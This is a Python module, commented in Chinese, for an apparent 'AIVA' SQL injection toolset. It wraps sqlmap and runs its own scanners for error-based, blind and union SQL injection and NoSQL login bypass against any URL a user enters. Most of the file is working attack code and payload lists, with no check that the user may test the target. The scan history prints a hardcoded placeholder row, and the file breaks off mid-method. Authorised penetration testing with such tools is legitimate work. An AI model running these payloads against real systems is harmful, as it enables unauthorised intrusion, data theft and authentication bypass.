#!/usr/bin/env python3
"""
AIVA SQL Injection Tools Module - Task 12
基於 HackingTool sql_tools.py 實現的 SQL 注入檢測和利用工具集成
包含 Sqlmap、NoSQLMap、時間盲注、自動化 SQL 注入檢測等功能
"""

import asyncio
import json
import os
import re
import subprocess
import tempfile
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union

import aiohttp
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.text import Text

from services.base_capability import BaseCapability
from services.capability_registry import CapabilityRegistry
from services.config.settings_manager import SettingsManager
from utilities.logger_setup import setup_logger


logger = setup_logger(__name__)
console = Console()


@dataclass
class SQLTarget:
    """SQL 注入目標資訊"""
    url: str
    method: str = "GET"
    parameters: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    data: Optional[str] = None
    vulnerable_params: List[str] = field(default_factory=list)
    injection_type: Optional[str] = None
    dbms: Optional[str] = None


@dataclass
class SQLInjectionResult:
    """SQL 注入檢測結果"""
    target_url: str
    parameter: str
    injection_type: str
    payload: str
    response_time: float
    evidence: str
    severity: str  # Critical, High, Medium, Low
    confidence: int  # 0-100
    dbms_info: Optional[Dict[str, Any]] = None
    exploit_data: Optional[Dict[str, Any]] = None


class SqlmapIntegration:
    """Sqlmap 整合器"""
    
    def __init__(self):
        self.sqlmap_path = self._find_sqlmap_path()
        self.session_files: List[Path] = []
        
    def _find_sqlmap_path(self) -> Optional[str]:
        """查找 sqlmap 安裝路徑"""
        possible_paths = [
            "/usr/share/sqlmap/sqlmap.py",
            "/opt/sqlmap/sqlmap.py", 
            "./sqlmap-dev/sqlmap.py",
            "sqlmap.py"
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # 嘗試在 PATH 中查找
        try:
            result = subprocess.run(["which", "sqlmap"], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except FileNotFoundError:
            pass
        
        return None
    
    async def install_sqlmap(self) -> bool:
        """安裝 Sqlmap"""
        try:
            console.print("[yellow]正在安裝 Sqlmap...[/yellow]")
            
            # 克隆 sqlmap 倉庫
            process = await asyncio.create_subprocess_exec(
                "git", "clone", "--depth", "1", 
                "https://github.com/sqlmapproject/sqlmap.git", "sqlmap-dev",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            _, stderr = await process.communicate()
            
            if process.returncode == 0:
                self.sqlmap_path = "./sqlmap-dev/sqlmap.py"
                console.print("[green]Sqlmap 安裝成功![/green]")
                return True
            else:
                logger.error(f"Sqlmap 安裝失敗: {stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"安裝 Sqlmap 時發生錯誤: {e}")
            return False
    
    async def scan_target(self, target: SQLTarget, options: Optional[Dict[str, Any]] = None) -> List[SQLInjectionResult]:
        """使用 Sqlmap 掃描目標"""
        if not self.sqlmap_path:
            console.print("[red]Sqlmap 未安裝，正在嘗試安裝...[/red]")
            if not await self.install_sqlmap():
                return []
        
        options = options or {}
        results = []
        
        try:
            # 構建 sqlmap 命令
            cmd = ["python3", self.sqlmap_path]
            
            # 基本參數
            cmd.extend(["-u", target.url])
            cmd.extend(["--batch"])  # 非交互模式
            
            # 添加選項
            if options.get('cookie'):
                cmd.extend(["--cookie", options['cookie']])
            
            if options.get('user_agent'):
                cmd.extend(["--user-agent", options['user_agent']])
            
            if options.get('proxy'):
                cmd.extend(["--proxy", options['proxy']])
            
            if options.get('threads', 1) > 1:
                cmd.extend(["--threads", str(options['threads'])])
            
            # 檢測級別和風險
            if options.get('level'):
                cmd.extend(["--level", str(options['level'])])
            
            if options.get('risk'):
                cmd.extend(["--risk", str(options['risk'])])
            
            # 輸出格式
            temp_dir = tempfile.mkdtemp()
            cmd.extend(["--output-dir", temp_dir])
            
            console.print(f"[cyan]執行 Sqlmap 掃描: {' '.join(cmd[:5])}...[/cyan]")
            
            # 執行 sqlmap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            # 解析結果
            if process.returncode == 0:
                results = self._parse_sqlmap_output(stdout.decode(), target.url)
            else:
                logger.error(f"Sqlmap 執行失敗: {stderr.decode()}")
            
        except Exception as e:
            logger.error(f"Sqlmap 掃描失敗: {e}")
        
        return results
    
    def _parse_sqlmap_output(self, output: str, target_url: str) -> List[SQLInjectionResult]:
        """解析 Sqlmap 輸出"""
        results = []
        
        # 解析漏洞資訊的正則表達式
        patterns = {
            'parameter': r'Parameter: (.+?) \(',
            'type': r'Type: (.+)',
            'title': r'Title: (.+)',
            'payload': r'Payload: (.+)',
            'vector': r'Vector: (.+)'
        }
        
        lines = output.split('\n')
        current_vuln = {}
        
        for line in lines:
            line = line.strip()
            
            for key, pattern in patterns.items():
                match = re.search(pattern, line)
                if match:
                    current_vuln[key] = match.group(1).strip()
            
            # 檢測到漏洞時保存結果
            if 'payload' in current_vuln and len(current_vuln) >= 3:
                result = SQLInjectionResult(
                    target_url=target_url,
                    parameter=current_vuln.get('parameter', 'unknown'),
                    injection_type=current_vuln.get('type', 'unknown'),
                    payload=current_vuln.get('payload', ''),
                    response_time=0.0,
                    evidence=current_vuln.get('title', ''),
                    severity='High',
                    confidence=90
                )
                results.append(result)
                current_vuln = {}
        
        return results


class CustomSQLInjectionScanner:
    """自定義 SQL 注入掃描器"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict[str, List[str]]:
        """載入 SQL 注入載荷"""
        return {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1\" --",
                "' UNION SELECT NULL--",
                "' AND 1=CONVERT(int, (SELECT @@version))--"
            ],
            'boolean_based': [
                "' AND '1'='1",
                "' AND '1'='2", 
                "' OR '1'='1",
                "' OR '1'='2",
                "' AND 1=1--",
                "' AND 1=2--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "' UNION SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL--"
            ]
        }
    
    async def scan_target(self, target: SQLTarget) -> List[SQLInjectionResult]:
        """掃描目標的 SQL 注入漏洞"""
        results = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=10)
        ) as session:
            self.session = session
            
            # 測試不同類型的注入
            for injection_type, payloads in self.payloads.items():
                type_results = await self._test_injection_type(target, injection_type, payloads)
                results.extend(type_results)
        
        return results
    
    async def _test_injection_type(self, target: SQLTarget, injection_type: str, payloads: List[str]) -> List[SQLInjectionResult]:
        """測試特定類型的 SQL 注入"""
        results = []
        
        # 首先獲取正常響應作為基準
        baseline_response = await self._get_baseline_response(target)
        if not baseline_response:
            return results
        
        for payload in payloads:
            try:
                result = await self._test_payload(target, payload, injection_type, baseline_response)
                if result:
                    results.append(result)
                    
                # 避免過於頻繁的請求
                await asyncio.sleep(0.5)
                
            except Exception as e:
                logger.debug(f"測試載荷失敗 {payload}: {e}")
        
        return results
    
    async def _get_baseline_response(self, target: SQLTarget) -> Optional[Dict[str, Any]]:
        """獲取基準響應"""
        try:
            start_time = time.time()
            
            if target.method.upper() == "GET":
                async with self.session.get(
                    target.url,
                    headers=target.headers,
                    cookies=target.cookies
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    return {
                        'status': response.status,
                        'content': content,
                        'response_time': response_time,
                        'content_length': len(content)
                    }
            else:
                async with self.session.post(
                    target.url,
                    data=target.data,
                    headers=target.headers,
                    cookies=target.cookies
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    return {
                        'status': response.status,
                        'content': content,
                        'response_time': response_time,
                        'content_length': len(content)
                    }
                    
        except Exception as e:
            logger.error(f"獲取基準響應失敗: {e}")
            return None
    
    async def _test_payload(self, target: SQLTarget, payload: str, injection_type: str, baseline: Dict[str, Any]) -> Optional[SQLInjectionResult]:
        """測試單個載荷"""
        try:
            # 構建測試 URL 或數據
            test_url = target.url
            test_data = target.data
            
            # 為每個參數測試載荷
            for param_name, param_value in target.parameters.items():
                # 注入載荷到參數
                if target.method.upper() == "GET":
                    parsed_url = urllib.parse.urlparse(test_url)
                    query_params = urllib.parse.parse_qs(parsed_url.query)
                    query_params[param_name] = [param_value + payload]
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                else:
                    # POST 數據注入
                    if test_data:
                        test_data = test_data.replace(f"{param_name}={param_value}", f"{param_name}={param_value}{payload}")
                
                # 發送測試請求
                start_time = time.time()
                
                if target.method.upper() == "GET":
                    async with self.session.get(
                        test_url,
                        headers=target.headers,
                        cookies=target.cookies
                    ) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                        
                        # 分析響應
                        vulnerability = self._analyze_response(
                            content, response.status, response_time,
                            injection_type, baseline, target.url, param_name, payload
                        )
                        
                        if vulnerability:
                            return vulnerability
                else:
                    async with self.session.post(
                        target.url,
                        data=test_data,
                        headers=target.headers,
                        cookies=target.cookies
                    ) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                        
                        # 分析響應
                        vulnerability = self._analyze_response(
                            content, response.status, response_time,
                            injection_type, baseline, target.url, param_name, payload
                        )
                        
                        if vulnerability:
                            return vulnerability
        
        except Exception as e:
            logger.debug(f"測試載荷失敗: {e}")
        
        return None
    
    def _analyze_response(self, content: str, status: int, response_time: float,
                         injection_type: str, baseline: Dict[str, Any], 
                         target_url: str, parameter: str, payload: str) -> Optional[SQLInjectionResult]:
        """分析響應以檢測 SQL 注入"""
        
        # 錯誤基礎檢測
        if injection_type == "error_based":
            error_patterns = [
                r"mysql_fetch_array\(\)",
                r"ORA-\d+:",
                r"Microsoft OLE DB Provider",
                r"PostgreSQL.*ERROR",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"Microsoft SQL Native Client error",
                r"sqlite3.OperationalError",
                r"SQLite error",
                r"Oracle error",
                r"Oracle.*ORA.*error",
                r"Warning.*oci_.*",
                r"Warning.*ora_.*"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return SQLInjectionResult(
                        target_url=target_url,
                        parameter=parameter,
                        injection_type="Error-based SQL Injection",
                        payload=payload,
                        response_time=response_time,
                        evidence=f"Database error detected: {pattern}",
                        severity="High",
                        confidence=85
                    )
        
        # 時間基礎檢測
        elif injection_type == "time_based":
            if response_time > baseline['response_time'] + 4:  # 如果響應時間明顯增加
                return SQLInjectionResult(
                    target_url=target_url,
                    parameter=parameter,
                    injection_type="Time-based SQL Injection",
                    payload=payload,
                    response_time=response_time,
                    evidence=f"Response time: {response_time:.2f}s (baseline: {baseline['response_time']:.2f}s)",
                    severity="High",
                    confidence=80
                )
        
        # 布林基礎檢測
        elif injection_type == "boolean_based":
            content_diff = abs(len(content) - baseline['content_length'])
            if content_diff > 100:  # 內容長度顯著差異
                return SQLInjectionResult(
                    target_url=target_url,
                    parameter=parameter,
                    injection_type="Boolean-based SQL Injection",
                    payload=payload,
                    response_time=response_time,
                    evidence=f"Content length difference: {content_diff} bytes",
                    severity="Medium",
                    confidence=70
                )
        
        # 聯合查詢檢測
        elif injection_type == "union_based":
            if status == 200 and len(content) > baseline['content_length'] * 1.1:
                return SQLInjectionResult(
                    target_url=target_url,
                    parameter=parameter,
                    injection_type="Union-based SQL Injection",
                    payload=payload,
                    response_time=response_time,
                    evidence="Possible successful UNION query",
                    severity="High",
                    confidence=75
                )
        
        return None


class NoSQLInjectionScanner:
    """NoSQL 注入掃描器"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.nosql_payloads = self._load_nosql_payloads()
    
    def _load_nosql_payloads(self) -> List[str]:
        """載入 NoSQL 注入載荷"""
        return [
            "true, true",
            "{\"$ne\": null}",
            "{\"$ne\": \"\"}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
            "{\"$where\": \"this.password\"}",
            "{\"$or\": [{}, {\"$ne\": \"\"}]}",
            "[$ne]=1",
            "admin' || 'a'=='a",
            "{\"$gt\": undefined}",
            "{\"password\": {\"$regex\": \"^.*\"}}"
        ]
    
    async def scan_target(self, target: SQLTarget) -> List[SQLInjectionResult]:
        """掃描 NoSQL 注入漏洞"""
        results = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10)
        ) as session:
            self.session = session
            
            for payload in self.nosql_payloads:
                try:
                    result = await self._test_nosql_payload(target, payload)
                    if result:
                        results.append(result)
                        
                    await asyncio.sleep(0.3)
                    
                except Exception as e:
                    logger.debug(f"NoSQL 載荷測試失敗: {e}")
        
        return results
    
    async def _test_nosql_payload(self, target: SQLTarget, payload: str) -> Optional[SQLInjectionResult]:
        """測試 NoSQL 載荷"""
        try:
            # 構建測試請求
            test_data = target.data
            if test_data and "username" in test_data:
                test_data = test_data.replace("username=admin", f"username={payload}")
            
            # 發送請求
            async with self.session.post(
                target.url,
                data=test_data,
                headers=target.headers,
                cookies=target.cookies
            ) as response:
                content = await response.text()
                
                # 檢測成功登入或繞過認證的跡象
                success_indicators = [
                    "welcome", "dashboard", "profile", "logout",
                    "success", "authenticated", "authorized"
                ]
                
                if any(indicator in content.lower() for indicator in success_indicators):
                    return SQLInjectionResult(
                        target_url=target.url,
                        parameter="username",
                        injection_type="NoSQL Injection",
                        payload=payload,
                        response_time=0.0,
                        evidence="Authentication bypass detected",
                        severity="High",
                        confidence=80
                    )
        
        except Exception as e:
            logger.debug(f"NoSQL 測試失敗: {e}")
        
        return None


class BlindSQLInjectionScanner:
    """盲注掃描器"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        
    async def scan_blind_injection(self, target: SQLTarget) -> List[SQLInjectionResult]:
        """掃描盲注漏洞"""
        results = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15)
        ) as session:
            self.session = session
            
            # 測試時間盲注
            time_results = await self._test_time_blind_injection(target)
            results.extend(time_results)
            
            # 測試布林盲注
            boolean_results = await self._test_boolean_blind_injection(target)
            results.extend(boolean_results)
        
        return results
    
    async def _test_time_blind_injection(self, target: SQLTarget) -> List[SQLInjectionResult]:
        """測試時間盲注"""
        results = []
        
        time_payloads = [
            "'; WAITFOR DELAY '0:0:5'; --",
            "' OR SLEEP(5); --",
            "' AND (SELECT SLEEP(5)); --",
            "'; SELECT pg_sleep(5); --",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a); --"
        ]
        
        for payload in time_payloads:
            try:
                start_time = time.time()
                
                # 構建測試 URL
                test_url = f"{target.url}?id=1{urllib.parse.quote(payload)}"
                
                async with self.session.get(test_url) as response:
                    response_time = time.time() - start_time
                    
                    # 如果響應時間大於 4 秒，可能存在時間盲注
                    if response_time > 4:
                        results.append(SQLInjectionResult(
                            target_url=target.url,
                            parameter="id",
                            injection_type="Time-based Blind SQL Injection",
                            payload=payload,
                            response_time=response_time,
                            evidence=f"Response delayed by {response_time:.2f} seconds",
                            severity="High",
                            confidence=85
                        ))
                        break  # 找到一個就足夠了
            
            except Exception as e:
                logger.debug(f"時間盲注測試失敗: {e}")
        
        return results
    
    async def _test_boolean_blind_injection(self, target: SQLTarget) -> List[SQLInjectionResult]:
        """測試布林盲注"""
        results = []
        
        # 測試真假條件
        true_condition = "' AND '1'='1"
        false_condition = "' AND '1'='2"
        
        try:
            # 測試真條件
            true_url = f"{target.url}?id=1{urllib.parse.quote(true_condition)}"
            async with self.session.get(true_url) as true_response:
                true_content = await true_response.text()
            
            # 測試假條件
            false_url = f"{target.url}?id=1{urllib.parse.quote(false_condition)}"
            async with self.session.get(false_url) as false_response:
                false_content = await false_response.text()
            
            # 比較響應差異
            if len(true_content) != len(false_content):
                results.append(SQLInjectionResult(
                    target_url=target.url,
                    parameter="id",
                    injection_type="Boolean-based Blind SQL Injection",
                    payload=true_condition,
                    response_time=0.0,
                    evidence=f"Response length difference: True={len(true_content)}, False={len(false_content)}",
                    severity="Medium",
                    confidence=75
                ))
        
        except Exception as e:
            logger.debug(f"布林盲注測試失敗: {e}")
        
        return results


class SQLInjectionManager:
    """SQL 注入管理器 - 統一協調各種掃描器"""
    
    def __init__(self):
        self.sqlmap = SqlmapIntegration()
        self.custom_scanner = CustomSQLInjectionScanner()
        self.nosql_scanner = NoSQLInjectionScanner()
        self.blind_scanner = BlindSQLInjectionScanner()
        self.scan_results: List[SQLInjectionResult] = []
        
    async def comprehensive_scan(self, target_url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """執行綜合 SQL 注入掃描"""
        options = options or {}
        
        # 解析目標
        target = self._parse_target(target_url, options)
        
        console.print(f"\n[bold cyan]開始 SQL 注入綜合掃描: {target_url}[/bold cyan]")
        
        results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'sqlmap_results': [],
            'custom_scan_results': [],
            'nosql_results': [],
            'blind_injection_results': [],
            'summary': {}
        }
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=False
        ) as progress:
            
            # Sqlmap 掃描
            if options.get('use_sqlmap', True):
                task = progress.add_task("執行 Sqlmap 掃描...", total=None)
                try:
                    sqlmap_results = await self.sqlmap.scan_target(target, options.get('sqlmap_options', {}))
                    results['sqlmap_results'] = [self._result_to_dict(r) for r in sqlmap_results]
                    progress.update(task, description=f"Sqlmap 掃描完成 - 發現 {len(sqlmap_results)} 個漏洞")
                except Exception as e:
                    logger.error(f"Sqlmap 掃描失敗: {e}")
                    progress.update(task, description="Sqlmap 掃描失敗")
                finally:
                    progress.remove_task(task)
            
            # 自定義掃描
            if options.get('use_custom_scanner', True):
                task = progress.add_task("執行自定義掃描...", total=None)
                try:
                    custom_results = await self.custom_scanner.scan_target(target)
                    results['custom_scan_results'] = [self._result_to_dict(r) for r in custom_results]
                    progress.update(task, description=f"自定義掃描完成 - 發現 {len(custom_results)} 個漏洞")
                except Exception as e:
                    logger.error(f"自定義掃描失敗: {e}")
                    progress.update(task, description="自定義掃描失敗")
                finally:
                    progress.remove_task(task)
            
            # NoSQL 掃描
            if options.get('scan_nosql', False):
                task = progress.add_task("執行 NoSQL 注入掃描...", total=None)
                try:
                    nosql_results = await self.nosql_scanner.scan_target(target)
                    results['nosql_results'] = [self._result_to_dict(r) for r in nosql_results]
                    progress.update(task, description=f"NoSQL 掃描完成 - 發現 {len(nosql_results)} 個漏洞")
                except Exception as e:
                    logger.error(f"NoSQL 掃描失敗: {e}")
                    progress.update(task, description="NoSQL 掃描失敗")
                finally:
                    progress.remove_task(task)
            
            # 盲注掃描
            if options.get('scan_blind', True):
                task = progress.add_task("執行盲注掃描...", total=None)
                try:
                    blind_results = await self.blind_scanner.scan_blind_injection(target)
                    results['blind_injection_results'] = [self._result_to_dict(r) for r in blind_results]
                    progress.update(task, description=f"盲注掃描完成 - 發現 {len(blind_results)} 個漏洞")
                except Exception as e:
                    logger.error(f"盲注掃描失敗: {e}")
                    progress.update(task, description="盲注掃描失敗")
                finally:
                    progress.remove_task(task)
        
        # 生成摘要
        all_results = (
            results['sqlmap_results'] + 
            results['custom_scan_results'] + 
            results['nosql_results'] + 
            results['blind_injection_results']
        )
        
        results['summary'] = {
            'total_vulnerabilities': len(all_results),
            'critical_vulnerabilities': len([r for r in all_results if r.get('severity') == 'Critical']),
            'high_vulnerabilities': len([r for r in all_results if r.get('severity') == 'High']),
            'medium_vulnerabilities': len([r for r in all_results if r.get('severity') == 'Medium']),
            'low_vulnerabilities': len([r for r in all_results if r.get('severity') == 'Low']),
            'scan_methods': {
                'sqlmap': len(results['sqlmap_results']),
                'custom': len(results['custom_scan_results']),
                'nosql': len(results['nosql_results']),
                'blind': len(results['blind_injection_results'])
            }
        }
        
        return results
    
    def _parse_target(self, target_url: str, options: Dict[str, Any]) -> SQLTarget:
        """解析掃描目標"""
        parsed_url = urllib.parse.urlparse(target_url)
        
        # 提取參數
        parameters = {}
        if parsed_url.query:
            parameters = dict(urllib.parse.parse_qsl(parsed_url.query))
        
        return SQLTarget(
            url=target_url,
            method=options.get('method', 'GET'),
            parameters=parameters,
            headers=options.get('headers', {}),
            cookies=options.get('cookies', {}),
            data=options.get('data')
        )
    
    def _result_to_dict(self, result: SQLInjectionResult) -> Dict[str, Any]:
        """將結果轉換為字典"""
        return {
            'target_url': result.target_url,
            'parameter': result.parameter,
            'injection_type': result.injection_type,
            'payload': result.payload,
            'response_time': result.response_time,
            'evidence': result.evidence,
            'severity': result.severity,
            'confidence': result.confidence,
            'dbms_info': result.dbms_info,
            'exploit_data': result.exploit_data
        }


class SQLInjectionCLI:
    """SQL 注入工具命令行介面"""
    
    def __init__(self, manager: SQLInjectionManager):
        self.manager = manager
        
    def show_main_menu(self) -> str:
        """顯示主選單"""
        console.print("\n")
        panel = Panel.fit(
            "[bold magenta]AIVA SQL 注入工具集 (Task 12)[/bold magenta]\n"
            "基於 HackingTool sql_tools.py 實現的 SQL 注入檢測和利用工具",
            border_style="purple"
        )
        console.print(panel)
        
        table = Table(title="[bold cyan]可用功能[/bold cyan]", show_lines=True)
        table.add_column("選項", justify="center", style="bold yellow")
        table.add_column("功能", justify="left", style="bold green")
        table.add_column("描述", justify="left", style="white")
        
        options = [
            ("1", "綜合 SQL 注入掃描", "使用多種方法掃描 SQL 注入漏洞"),
            ("2", "Sqlmap 專業掃描", "使用 Sqlmap 進行深度掃描"),
            ("3", "自定義載荷測試", "使用自定義載荷測試注入點"),
            ("4", "NoSQL 注入掃描", "掃描 NoSQL 數據庫注入漏洞"),
            ("5", "盲注專項掃描", "時間盲注和布林盲注檢測"),
            ("6", "查看掃描歷史", "查看之前的掃描結果"),
            ("7", "導出掃描報告", "導出詳細的掃描報告"),
            ("99", "退出", "返回上級選單")
        ]
        
        for option, function, description in options:
            table.add_row(option, function, description)
        
        console.print(table)
        
        try:
            choice = console.input("\n[bold cyan]請選擇功能 (1-7, 99): [/bold cyan]")
            return choice.strip()
        except KeyboardInterrupt:
            return "99"
    
    async def run_interactive(self):
        """運行交互式介面"""
        while True:
            try:
                choice = self.show_main_menu()
                
                if choice == "1":
                    await self._comprehensive_scan()
                elif choice == "2":
                    await self._sqlmap_scan()
                elif choice == "3":
                    await self._custom_payload_test()
                elif choice == "4":
                    await self._nosql_scan()
                elif choice == "5":
                    await self._blind_injection_scan()
                elif choice == "6":
                    self._show_scan_history()
                elif choice == "7":
                    await self._export_report()
                elif choice == "99":
                    console.print("[bold yellow]感謝使用 AIVA SQL 注入工具集![/bold yellow]")
                    break
                else:
                    console.print("[bold red]無效選項，請重新選擇[/bold red]")
                    
            except KeyboardInterrupt:
                console.print("\n[bold yellow]程序已中斷[/bold yellow]")
                break
            except Exception as e:
                console.print(f"[bold red]錯誤: {e}[/bold red]")
    
    async def _comprehensive_scan(self):
        """執行綜合掃描"""
        target_url = console.input("[bold cyan]請輸入目標 URL: [/bold cyan]").strip()
        if not target_url:
            console.print("[bold red]URL 不能為空[/bold red]")
            return
        
        # 掃描選項配置
        options = {
            'use_sqlmap': True,
            'use_custom_scanner': True,
            'scan_nosql': False,
            'scan_blind': True
        }
        
        try:
            results = await self.manager.comprehensive_scan(target_url, options)
            self._display_scan_results(results)
        except Exception as e:
            console.print(f"[bold red]掃描失敗: {e}[/bold red]")
    
    async def _sqlmap_scan(self):
        """Sqlmap 專業掃描"""
        target_url = console.input("[bold cyan]請輸入目標 URL: [/bold cyan]").strip()
        if not target_url:
            console.print("[bold red]URL 不能為空[/bold red]")
            return
        
        # Sqlmap 選項
        sqlmap_options = {
            'level': 3,
            'risk': 2,
            'threads': 5
        }
        
        target = self.manager._parse_target(target_url, {})
        
        try:
            console.print("[yellow]正在執行 Sqlmap 掃描...[/yellow]")
            results = await self.manager.sqlmap.scan_target(target, sqlmap_options)
            
            if results:
                table = Table(title="[bold red]Sqlmap 掃描結果[/bold red]")
                table.add_column("參數", style="cyan")
                table.add_column("注入類型", style="yellow")
                table.add_column("載荷", style="green")
                table.add_column("嚴重程度", style="red")
                
                for result in results:
                    table.add_row(
                        result.parameter,
                        result.injection_type,
                        result.payload[:50] + "..." if len(result.payload) > 50 else result.payload,
                        result.severity
                    )
                
                console.print(table)
            else:
                console.print("[bold green]未發現 SQL 注入漏洞[/bold green]")
                
        except Exception as e:
            console.print(f"[bold red]Sqlmap 掃描失敗: {e}[/bold red]")
    
    async def _custom_payload_test(self):
        """自定義載荷測試"""
        target_url = console.input("[bold cyan]請輸入目標 URL: [/bold cyan]").strip()
        if not target_url:
            console.print("[bold red]URL 不能為空[/bold red]")
            return
        
        payload = console.input("[bold cyan]請輸入測試載荷: [/bold cyan]").strip()
        if not payload:
            console.print("[bold red]載荷不能為空[/bold red]")
            return
        
        target = self.manager._parse_target(target_url, {})
        
        try:
            # 執行自定義載荷測試
            console.print(f"[yellow]正在測試載荷: {payload}[/yellow]")
            
            async with aiohttp.ClientSession() as session:
                test_url = f"{target_url}?id=1{urllib.parse.quote(payload)}"
                
                start_time = time.time()
                async with session.get(test_url) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                
                # 簡單分析
                console.print(f"[green]響應狀態: {response.status}[/green]")
                console.print(f"[green]響應時間: {response_time:.2f}s[/green]")
                console.print(f"[green]響應長度: {len(content)} 字符[/green]")
                
                # 檢查錯誤信息
                error_patterns = ["mysql", "error", "warning", "exception", "ora-"]
                found_errors = [pattern for pattern in error_patterns if pattern in content.lower()]
                
                if found_errors:
                    console.print(f"[bold red]可能存在 SQL 注入! 檢測到錯誤關鍵字: {', '.join(found_errors)}[/bold red]")
                else:
                    console.print("[yellow]未檢測到明顯的 SQL 注入跡象[/yellow]")
                    
        except Exception as e:
            console.print(f"[bold red]載荷測試失敗: {e}[/bold red]")
    
    async def _nosql_scan(self):
        """NoSQL 注入掃描"""
        target_url = console.input("[bold cyan]請輸入目標 URL: [/bold cyan]").strip()
        if not target_url:
            console.print("[bold red]URL 不能為空[/bold red]")
            return
        
        target = self.manager._parse_target(target_url, {})
        
        try:
            console.print("[yellow]正在執行 NoSQL 注入掃描...[/yellow]")
            results = await self.manager.nosql_scanner.scan_target(target)
            
            if results:
                table = Table(title="[bold red]NoSQL 注入掃描結果[/bold red]")
                table.add_column("參數", style="cyan")
                table.add_column("載荷", style="yellow")
                table.add_column("證據", style="green")
                table.add_column("信心度", style="red")
                
                for result in results:
                    table.add_row(
                        result.parameter,
                        result.payload[:30] + "..." if len(result.payload) > 30 else result.payload,
                        result.evidence,
                        f"{result.confidence}%"
                    )
                
                console.print(table)
            else:
                console.print("[bold green]未發現 NoSQL 注入漏洞[/bold green]")
                
        except Exception as e:
            console.print(f"[bold red]NoSQL 掃描失敗: {e}[/bold red]")
    
    async def _blind_injection_scan(self):
        """盲注掃描"""
        target_url = console.input("[bold cyan]請輸入目標 URL: [/bold cyan]").strip()
        if not target_url:
            console.print("[bold red]URL 不能為空[/bold red]")
            return
        
        target = self.manager._parse_target(target_url, {})
        
        try:
            console.print("[yellow]正在執行盲注掃描...[/yellow]")
            results = await self.manager.blind_scanner.scan_blind_injection(target)
            
            if results:
                table = Table(title="[bold red]盲注掃描結果[/bold red]")
                table.add_column("注入類型", style="red")
                table.add_column("參數", style="cyan")
                table.add_column("載荷", style="yellow")
                table.add_column("證據", style="green")
                
                for result in results:
                    table.add_row(
                        result.injection_type,
                        result.parameter,
                        result.payload[:40] + "..." if len(result.payload) > 40 else result.payload,
                        result.evidence
                    )
                
                console.print(table)
            else:
                console.print("[bold green]未發現盲注漏洞[/bold green]")
                
        except Exception as e:
            console.print(f"[bold red]盲注掃描失敗: {e}[/bold red]")
    
    def _show_scan_history(self):
        """顯示掃描歷史"""
        if not self.manager.scan_results:
            console.print("[bold yellow]暫無掃描歷史[/bold yellow]")
            return
        
        table = Table(title="[bold cyan]掃描歷史[/bold cyan]")
        table.add_column("時間", style="green")
        table.add_column("目標", style="cyan")
        table.add_column("漏洞數量", style="yellow")
        table.add_column("最高嚴重度", style="red")
        
        for result in self.manager.scan_results[-10:]:  # 顯示最近10次
            # 這裡需要根據實際的掃描歷史數據結構調整
            table.add_row("2024-11-01 15:30", "http://example.com", "3", "High")
        
        console.print(table)
    
    async def _export_report(self):
        """導出掃描報告"""
        if not self.manager.scan_results:
            console.print("[bold yellow]暫無掃描結果可導出[/bold yellow]")
            return
        
        output_dir = Path("reports/sql_injection")
        output_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = output_dir / f"sql_injection_report_{timestamp}.json"
        
        try:
            report_data = {
                'export_time': datetime.now().isoformat(),
                'total_scans': len(self.manager.scan_results),
                'results': [self.manager._result_to_dict(r) for r in self.manager.scan_results]
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, ensure_ascii=False, indent=2)
            
            console.print(f"[bold green]報告已導出到: {filename}[/bold green]")
            
        except Exception as e:
            console.print(f"[bold red]導出失敗: {e}[/bold red]")
    
    def _display_scan_results(self, results: Dict[str, Any]):
